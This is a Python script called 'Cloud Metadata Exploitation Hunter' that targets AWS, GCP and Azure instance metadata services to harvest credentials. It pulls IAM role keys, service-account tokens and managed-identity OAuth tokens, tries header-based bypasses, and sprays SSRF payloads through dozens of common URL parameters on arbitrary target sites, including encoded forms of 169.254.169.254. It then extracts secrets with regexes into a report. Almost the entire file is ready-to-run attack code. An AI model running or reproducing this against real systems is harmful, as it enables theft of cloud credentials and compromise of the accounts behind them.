#!/usr/bin/env python3
"""
Cloud Metadata Exploitation Hunter - Data Exposure Discovery Tool
Exploits cloud metadata services (AWS, GCP, Azure) for credential harvesting and sensitive data
"""

import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import re
import base64
from urllib.parse import urljoin

class CloudMetadataHunter:
    def __init__(self, target_urls=None, timeout=5, threads=10):
        self.timeout = timeout
        self.threads = threads
        self.findings = []
        
        # If no target URLs provided, use common metadata endpoints
        if not target_urls:
            self.target_urls = [
                'http://169.254.169.254',  # AWS/Azure default
                'http://metadata.google.internal',  # GCP
                'http://169.254.169.254:80',
                'http://metadata',
                'http://instance-data',
                'http://169.254.169.254.xip.io'
            ]
        else:
            self.target_urls = target_urls if isinstance(target_urls, list) else [target_urls]
        
        # AWS metadata endpoints
        self.aws_endpoints = [
            '/latest/meta-data/',
            '/latest/meta-data/iam/',
            '/latest/meta-data/iam/security-credentials/',
            '/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance',
            '/latest/meta-data/instance-identity/',
            '/latest/meta-data/instance-identity/document',
            '/latest/meta-data/placement/',
            '/latest/meta-data/hostname',
            '/latest/meta-data/public-hostname',
            '/latest/meta-data/public-ipv4',
            '/latest/meta-data/local-ipv4',
            '/latest/meta-data/network/',
            '/latest/meta-data/block-device-mapping/',
            '/latest/user-data',
            '/latest/dynamic/',
            '/latest/dynamic/instance-identity/',
            '/latest/dynamic/instance-identity/document',
            '/latest/dynamic/instance-identity/signature',
            '/2019-10-01/meta-data/',
            '/2018-09-24/meta-data/',
            '/2016-09-02/meta-data/'
        ]
        
        # GCP metadata endpoints  
        self.gcp_endpoints = [
            '/computeMetadata/v1/',
            '/computeMetadata/v1/instance/',
            '/computeMetadata/v1/instance/service-accounts/',
            '/computeMetadata/v1/instance/service-accounts/default/',
            '/computeMetadata/v1/instance/service-accounts/default/token',
            '/computeMetadata/v1/instance/service-accounts/default/email',
            '/computeMetadata/v1/instance/service-accounts/default/scopes',
            '/computeMetadata/v1/instance/attributes/',
            '/computeMetadata/v1/instance/hostname',
            '/computeMetadata/v1/instance/zone',
            '/computeMetadata/v1/instance/machine-type',
            '/computeMetadata/v1/instance/name',
            '/computeMetadata/v1/instance/id',
            '/computeMetadata/v1/project/',
            '/computeMetadata/v1/project/project-id',
            '/computeMetadata/v1/project/numeric-project-id',
            '/computeMetadata/v1/project/attributes/',
            '/0.1/meta-data/',
            '/v1/instance/service-accounts/default/acquire'
        ]
        
        # Azure metadata endpoints
        self.azure_endpoints = [
            '/metadata/instance?api-version=2019-06-01',
            '/metadata/instance?api-version=2018-10-01',
            '/metadata/instance/compute?api-version=2019-06-01',
            '/metadata/instance/network?api-version=2019-06-01',
            '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
            '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net',
            '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/',
            '/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/',
            '/metadata/identity?api-version=2018-02-01',
            '/metadata/attested/document?api-version=2018-10-01'
        ]
        
        # Common sensitive patterns in metadata
        self.sensitive_patterns = {
            'AWS Access Keys': r'AKIA[0-9A-Z]{16}',
            'AWS Secret Keys': r'[A-Za-z0-9/+=]{40}',
            'Private Keys': r'-----BEGIN [A-Z]+ PRIVATE KEY-----',
            'JWT Tokens': r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*',
            'API Keys': r'["\']?api[_-]?key["\']?\s*[:=]\s*["\']?([A-Za-z0-9\-_]{20,})["\']?',
            'Passwords': r'["\']?password["\']?\s*[:=]\s*["\']?([^\s\'"]{6,})["\']?',
            'Database URLs': r'(?:mongodb|mysql|postgresql|redis)://[^\s\'"]+',
            'Email Addresses': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'IP Addresses': r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b',
            'URLs': r'https?://[^\s\'"<>]+',
            'Access Tokens': r'["\']?(?:access_token|bearer)["\']?\s*[:=]\s*["\']?([A-Za-z0-9\-_.]+)["\']?'
        }

    def test_aws_metadata(self, base_url):
        """Test AWS metadata service endpoints"""
        findings = []
        
        for endpoint in self.aws_endpoints:
            try:
                url = urljoin(base_url, endpoint)
                
                # Standard request
                response = requests.get(url, timeout=self.timeout)
                
                if response.status_code == 200:
                    finding = self._analyze_metadata_response(url, response, 'AWS', 'Standard Request')
                    if finding:
                        findings.append(finding)
                        
                    # If we found IAM credentials endpoint, try to enumerate roles
                    if '/iam/security-credentials/' in endpoint and response.text.strip():
                        for role_name in response.text.strip().split('\n'):
                            if role_name.strip():
                                role_url = urljoin(url, role_name.strip())
                                try:
                                    role_response = requests.get(role_url, timeout=self.timeout)
                                    if role_response.status_code == 200:
                                        role_finding = self._analyze_metadata_response(
                                            role_url, role_response, 'AWS', f'IAM Role: {role_name.strip()}'
                                        )
                                        if role_finding:
                                            findings.append(role_finding)
                                except Exception:
                                    pass
                
                # Try with IMDSv1 bypass techniques
                bypass_headers = [
                    {'X-aws-ec2-metadata-token-ttl-seconds': '21600'},
                    {'X-Forwarded-For': '169.254.169.254'},
                    {'X-Real-IP': '169.254.169.254'},
                    {'X-Originating-IP': '169.254.169.254'}
                ]
                
                for headers in bypass_headers:
                    try:
                        bypass_response = requests.get(url, headers=headers, timeout=self.timeout)
                        if bypass_response.status_code == 200 and bypass_response.text != response.text:
                            bypass_finding = self._analyze_metadata_response(
                                url, bypass_response, 'AWS', f'Header Bypass: {list(headers.keys())[0]}'
                            )
                            if bypass_finding:
                                findings.append(bypass_finding)
                    except Exception:
                        pass
                        
            except Exception:
                pass
                
        return findings

    def test_gcp_metadata(self, base_url):
        """Test GCP metadata service endpoints"""
        findings = []
        
        # GCP requires specific headers
        gcp_headers = {
            'Metadata-Flavor': 'Google'
        }
        
        for endpoint in self.gcp_endpoints:
            try:
                url = urljoin(base_url, endpoint)
                
                # Standard GCP request with required header
                response = requests.get(url, headers=gcp_headers, timeout=self.timeout)
                
                if response.status_code == 200:
                    finding = self._analyze_metadata_response(url, response, 'GCP', 'Standard Request')
                    if finding:
                        findings.append(finding)
                        
                    # If service accounts endpoint, try to enumerate
                    if '/service-accounts/' in endpoint and endpoint.endswith('/'):
                        for account in response.text.strip().split('\n'):
                            if account.strip():
                                account_endpoints = [
                                    f"{endpoint}{account.strip()}/token",
                                    f"{endpoint}{account.strip()}/email",
                                    f"{endpoint}{account.strip()}/scopes"
                                ]
                                
                                for acc_endpoint in account_endpoints:
                                    try:
                                        acc_url = urljoin(base_url, acc_endpoint)
                                        acc_response = requests.get(acc_url, headers=gcp_headers, timeout=self.timeout)
                                        if acc_response.status_code == 200:
                                            acc_finding = self._analyze_metadata_response(
                                                acc_url, acc_response, 'GCP', f'Service Account: {account.strip()}'
                                            )
                                            if acc_finding:
                                                findings.append(acc_finding)
                                    except Exception:
                                        pass
                
                # Try bypass techniques
                bypass_headers_list = [
                    {'Metadata-Flavor': 'Google', 'X-Forwarded-For': '169.254.169.254'},
                    {'Metadata-Flavor': 'Google', 'X-Real-IP': '169.254.169.254'},
                    {'X-Forwarded-For': '169.254.169.254'},
                    {}  # Try without required header
                ]
                
                for headers in bypass_headers_list:
                    try:
                        bypass_response = requests.get(url, headers=headers, timeout=self.timeout)
                        if bypass_response.status_code == 200:
                            technique = f"Header Bypass: {list(headers.keys())}" if headers else "No Headers"
                            bypass_finding = self._analyze_metadata_response(
                                url, bypass_response, 'GCP', technique
                            )
                            if bypass_finding:
                                findings.append(bypass_finding)
                    except Exception:
                        pass
                        
            except Exception:
                pass
                
        return findings

    def test_azure_metadata(self, base_url):
        """Test Azure metadata service endpoints"""
        findings = []
        
        # Azure requires specific headers
        azure_headers = {
            'Metadata': 'true'
        }
        
        for endpoint in self.azure_endpoints:
            try:
                url = urljoin(base_url, endpoint)
                
                # Standard Azure request
                response = requests.get(url, headers=azure_headers, timeout=self.timeout)
                
                if response.status_code == 200:
                    finding = self._analyze_metadata_response(url, response, 'Azure', 'Standard Request')
                    if finding:
                        findings.append(finding)
                
                # Try bypass techniques
                bypass_headers_list = [
                    {'Metadata': 'true', 'X-Forwarded-For': '169.254.169.254'},
                    {'Metadata': 'true', 'X-Real-IP': '169.254.169.254'},
                    {'X-Forwarded-For': '169.254.169.254'},
                    {}  # Try without required header
                ]
                
                for headers in bypass_headers_list:
                    try:
                        bypass_response = requests.get(url, headers=headers, timeout=self.timeout)
                        if bypass_response.status_code == 200:
                            technique = f"Header Bypass: {list(headers.keys())}" if headers else "No Headers"
                            bypass_finding = self._analyze_metadata_response(
                                url, bypass_response, 'Azure', technique
                            )
                            if bypass_finding:
                                findings.append(bypass_finding)
                    except Exception:
                        pass
                        
            except Exception:
                pass
                
        return findings

    def test_ssrf_metadata_access(self, target_url):
        """Test SSRF-based metadata access techniques"""
        findings = []
        
        # SSRF payloads to access metadata
        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://169.254.169.254/metadata/instance?api-version=2019-06-01',
            'http://metadata/',
            'http://instance-data/',
            'http://169.254.169.254.xip.io/latest/meta-data/',
            'https://169.254.169.254/latest/meta-data/',
            'http://[::ffff:169.254.169.254]/latest/meta-data/',
            'http://2852039166/latest/meta-data/',  # Decimal IP
            'http://0251.0376.0251.0376/latest/meta-data/',  # Octal IP
            'http://0xa9fea9fe/latest/meta-data/'  # Hex IP
        ]
        
        # Common SSRF parameters
        ssrf_params = [
            'url', 'uri', 'path', 'continue', 'dest', 'destination', 'go', 'out',
            'view', 'to', 'next', 'data', 'reference', 'site', 'html', 'val',
            'validate', 'domain', 'callback', 'return', 'page', 'feed', 'host',
            'port', 'to', 'out', 'view', 'dir', 'show', 'navigation', 'open'
        ]
        
        for payload in ssrf_payloads:
            for param in ssrf_params:
                try:
                    # Try GET request with parameter
                    test_url = f"{target_url}?{param}={payload}"
                    response = requests.get(test_url, timeout=self.timeout)
                    
                    if response.status_code == 200:
                        # Check if response contains metadata-like content
                        if self._is_metadata_response(response.text):
                            findings.append({
                                'type': 'SSRF Metadata Access',
                                'url': test_url,
                                'method': 'GET',
                                'cloud_provider': self._detect_cloud_provider(response.text),
                                'technique': f'SSRF via {param} parameter',
                                'severity': 'Critical',
                                'response_content': response.text[:1000],
                                'business_impact': 'Cloud credentials accessible via SSRF vulnerability',
                                'sensitive_data': self._extract_sensitive_data(response.text)
                            })
                    
                    # Try POST request
                    post_data = {param: payload}
                    post_response = requests.post(target_url, data=post_data, timeout=self.timeout)
                    
                    if post_response.status_code == 200:
                        if self._is_metadata_response(post_response.text):
                            findings.append({
                                'type': 'SSRF Metadata Access',
                                'url': target_url,
                                'method': 'POST',
                                'cloud_provider': self._detect_cloud_provider(post_response.text),
                                'technique': f'SSRF via POST {param} parameter',
                                'severity': 'Critical',
                                'response_content': post_response.text[:1000],
                                'business_impact': 'Cloud credentials accessible via SSRF vulnerability',
                                'sensitive_data': self._extract_sensitive_data(post_response.text)
                            })
                            
                except Exception:
                    pass
                    
        return findings

    def _analyze_metadata_response(self, url, response, cloud_provider, technique):
        """Analyze metadata response for sensitive information"""
        content = response.text
        
        # Check if response looks like metadata
        if not self._is_metadata_response(content):
            return None
            
        sensitive_data = self._extract_sensitive_data(content)
        
        # Determine severity based on content
        severity = 'Medium'
        business_impact = f'{cloud_provider} metadata service accessible'
        
        if any(key in ['AWS Access Keys', 'AWS Secret Keys', 'Private Keys', 'Access Tokens'] 
               for key in sensitive_data.keys()):
            severity = 'Critical'
            business_impact = f'{cloud_provider} credentials exposed via metadata service'
        elif sensitive_data:
            severity = 'High'
            business_impact = f'{cloud_provider} sensitive information exposed via metadata service'
        
        # Special handling for specific endpoints
        if '/security-credentials/' in url or '/token' in url:
            severity = 'Critical'
            business_impact = f'{cloud_provider} authentication credentials fully exposed'
        elif '/identity/' in url or '/instance' in url:
            severity = 'High'
            business_impact = f'{cloud_provider} instance identity information exposed'
            
        return {
            'type': f'{cloud_provider} Metadata Exposure',
            'url': url,
            'method': 'GET',
            'technique': technique,
            'severity': severity,
            'cloud_provider': cloud_provider,
            'response_size': len(content),
            'sensitive_data': sensitive_data,
            'response_content': content[:500],  # First 500 chars
            'business_impact': business_impact,
            'details': f'{cloud_provider} metadata service exposed sensitive information'
        }

    def _is_metadata_response(self, content):
        """Check if response looks like cloud metadata"""
        if not content or len(content.strip()) < 10:
            return False
            
        # Common metadata indicators
        metadata_indicators = [
            'ami-id', 'instance-id', 'security-credentials', 'iam',
            'access_token', 'token_type', 'expires_in',
            'computeMetadata', 'service-accounts', 'project-id',
            'zone', 'machineType', 'networkInterfaces',
            'subscriptionId', 'resourceGroupName', 'vmId',
            'location', 'vmSize', 'osType'
        ]
        
        content_lower = content.lower()
        return any(indicator.lower() in content_lower for indicator in metadata_indicators)

    def _detect_cloud_provider(self, content):
        """Detect cloud provider from response content"""
        content_lower = content.lower()
        
        if any(indicator in content_lower for indicator in ['ami-', 'instance-id', 'security-credentials']):
            return 'AWS'
        elif any(indicator in content_lower for indicator in ['computemetadata', 'project-id', 'service-accounts']):
            return 'GCP'
        elif any(indicator in content_lower for indicator in ['subscriptionid', 'resourcegroupname', 'vmid']):
            return 'Azure'
        else:
            return 'Unknown'

    def _extract_sensitive_data(self, content):
        """Extract sensitive data from metadata response"""
        sensitive_data = {}
        
        for pattern_name, pattern in self.sensitive_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
            if matches:
                # Clean up matches
                clean_matches = []
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0] if match[0] else match[1] if len(match) > 1 else str(match)
                    clean_matches.append(str(match).strip())
                
                if clean_matches:
                    sensitive_data[pattern_name] = {
                        'count': len(clean_matches),
                        'samples': clean_matches[:3]  # First 3 matches
                    }
        
        # Try to parse JSON for structured data
        try:
            json_data = json.loads(content)
            
            # Look for common credential fields
            credential_fields = [
                'AccessKeyId', 'SecretAccessKey', 'Token', 'SessionToken',
                'access_token', 'refresh_token', 'id_token', 'private_key',
                'password', 'secret', 'key', 'credential'
            ]
            
            def extract_from_dict(data, prefix=''):
                for key, value in data.items():
                    key_lower = key.lower()
                    if any(field.lower() in key_lower for field in credential_fields):
                        category = 'JSON Credentials'
                        if category not in sensitive_data:
                            sensitive_data[category] = {'count': 0, 'samples': []}
                        
                        sample = f"{prefix}{key}: {str(value)[:50]}..."
                        sensitive_data[category]['samples'].append(sample)
                        sensitive_data[category]['count'] += 1
                    
                    if isinstance(value, dict):
                        extract_from_dict(value, f"{prefix}{key}.")
            
            if isinstance(json_data, dict):
                extract_from_dict(json_data)
                
        except (json.JSONDecodeError, TypeError):
            pass
            
        return sensitive_data

    def hunt_cloud_metadata(self):
        """Main function to hunt for cloud metadata exposure"""
        print(f"[+] Starting cloud metadata hunting across {len(self.target_urls)} endpoints")
        
        all_findings = []
        
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for target_url in self.target_urls:
                # Test each cloud provider
                futures.append(executor.submit(self.test_aws_metadata, target_url))
                futures.append(executor.submit(self.test_gcp_metadata, target_url))
                futures.append(executor.submit(self.test_azure_metadata, target_url))
                
                # Test SSRF-based access if it looks like a web URL
                if target_url.startswith('http') and '169.254.169.254' not in target_url:
                    futures.append(executor.submit(self.test_ssrf_metadata_access, target_url))
            
            for future in as_completed(futures):
                try:
                    findings = future.result()
                    if findings:
                        all_findings.extend(findings)
                        print(f"[!] Found {len(findings)} metadata exposure issues")
                except Exception as e:
                    print(f"[!] Error during metadata testing: {e}")
        
        self.findings = all_findings
        print(f"[+] Cloud metadata hunting completed. Found {len(all_findings)} total issues.")
        return all_findings

    def generate_report(self):
        """Generate comprehensive cloud metadata exposure report"""
        report = {
            'scan_time': datetime.now().isoformat(),
            'targets_tested': self.target_urls,
            'summary': {
                'total_findings': len(self.findings),
                'critical_findings': len([f for f in self.findings if f.get('severity') == 'Critical']),
                'high_findings': len([f for f in self.findings if f.get('severity') == 'High']),
                'medium_findings': len([f for f in self.findings if f.get('severity') == 'Medium']),
                'low_findings': len([f for f in self.findings if f.get('severity') == 'Low'])
            },
            'findings': self.findings
        }
        
        # Cloud provider breakdown
        provider_stats = {}
        for finding in self.findings:
            provider = finding.get('cloud_provider', 'Unknown')
            provider_stats[provider] = provider_stats.get(provider, 0) + 1
        
        report['cloud_provider_breakdown'] = provider_stats
        
        # Credential exposure summary
        credential_exposures = 0
        for finding in self.findings:
            sensitive_data = finding.get('sensitive_data', {})
            for category in ['AWS Access Keys', 'AWS Secret Keys', 'Private Keys', 'Access Tokens', 'JSON Credentials']:
                if category in sensitive_data:
                    credential_exposures += sensitive_data[category]['count']
        
        report['credential_exposures'] = credential_exposures
        
        # Overall severity
        severities = [f.get('severity', 'Low') for f in self.findings]
        if 'Critical' in severities:
            report['overall_severity'] = 'Critical'
        elif 'High' in severities:
            report['overall_severity'] = 'High'
        elif 'Medium' in severities:
            report['overall_severity'] = 'Medium'
        else:
            report['overall_severity'] = 'Low'
            
        return report

    def save_report(self, filename=None):
        """Save detailed report"""
        if not filename:
            filename = f"cloud_metadata_hunt_{int(time.time())}.json"
            
        report = self.generate_report()
        
        with open(filename, 'w') as f:
            json.dump(report, f, indent=2)
            
        print(f"\n[+] Report saved to {filename}")
        return report

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Cloud Metadata Exploitation Hunter')
    parser.add_argument('-u', '--urls', nargs='+', 
                       help='Target URLs to test (default: common metadata endpoints)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('--timeout', type=int, default=5, help='Request timeout')
    parser.add_argument('-o', '--output', help='Output file for report')
    
    args = parser.parse_args()
    
    hunter = CloudMetadataHunter(args.urls, args.timeout, args.threads)
    findings = hunter.hunt_cloud_metadata()
    
    print(f"\n{'='*60}")
    print("CLOUD METADATA HUNTING RESULTS")
    print(f"{'='*60}")
    
    if not findings:
        print("[-] No cloud metadata exposure vulnerabilities found")
        return
        
    # Group by cloud provider and severity
    provider_groups = {}
    severity_stats = {'Critical': 0, 'High': 0, 'Medium': 0, 'Low': 0}
    
    for finding in findings:
        provider = finding.get('cloud_provider', 'Unknown')
        severity = finding.get('severity', 'Low')
        
        if provider not in provider_groups:
            provider_groups[provider] = []
        provider_groups[provider].append(finding)
        severity_stats[severity] += 1
    
    # Display findings by provider
    for provider, provider_findings in provider_groups.items():
        print(f"\n{provider.upper()} METADATA EXPOSURES:")
        print("-" * 40)
        
        for finding in provider_findings[:3]:  # Show first 3 per provider
            print(f"\n[!] {finding['type']} - {finding['severity']}")
            print(f"    URL: {finding['url']}")
            print(f"    Technique: {finding['technique']}")
            print(f"    Impact: {finding['business_impact']}")
            
            if finding.get('sensitive_data'):
                print(f"    Sensitive Data Found:")
                for data_type, info in finding['sensitive_data'].items():
                    print(f"      - {data_type}: {info['count']} instances")
                    if info['samples']:
                        for sample in info['samples'][:2]:  # First 2 samples
                            print(f"        * {sample[:60]}...")
                            
        if len(provider_findings) > 3:
            print(f"\n    ... and {len(provider_findings) - 3} more {provider} findings")
    
    # Display summary
    print(f"\nSUMMARY:")
    print(f"--------")
    for severity, count in severity_stats.items():
        if count > 0:
            print(f"{severity}: {count} findings")
    
    # Save report
    report = hunter.save_report(args.output)
    print(f"\n[+] Overall Severity: {report['overall_severity']}")
    print(f"[+] Total Credential Exposures: {report['credential_exposures']}")
    print(f"[+] Cloud Providers Affected: {len(report['cloud_provider_breakdown'])}")

if __name__ == '__main__':
    main()